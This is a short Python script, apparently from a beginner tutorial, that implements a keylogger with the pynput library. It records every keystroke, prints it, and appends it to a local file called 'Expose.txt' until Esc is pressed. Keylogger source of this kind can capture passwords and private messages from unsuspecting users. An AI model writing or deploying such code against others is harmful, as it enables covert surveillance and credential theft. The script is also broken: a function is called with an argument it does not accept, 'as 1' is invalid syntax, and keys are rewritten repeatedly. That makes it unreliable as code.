# importing pynput libraries
import pynput # install pip install pynput
from pynput.keyboard import Key, Listener

keys = []

# as you write, this function calls write_file and prints the keys you type
def on_press(key):
	keys.append(key)
	write_file(keys)
	print(key)

# when we press Esc we want to exit
def on_release(key):
	if key==Key.esc:
		return False

# this function writes to our text file
def write_file():
	# we want to record what we type in a text file
	with open("Expose.txt", 'a') as f:
		for key in keys:
			k = str(key).replace("'", '')
			if k.find("space") > 0:
				f.write('\n')
			elif k.find("Key") == -1:
				f.write(k)

with Listener(on_press=on_press, on_release=on_release) as 1:
	1.join()
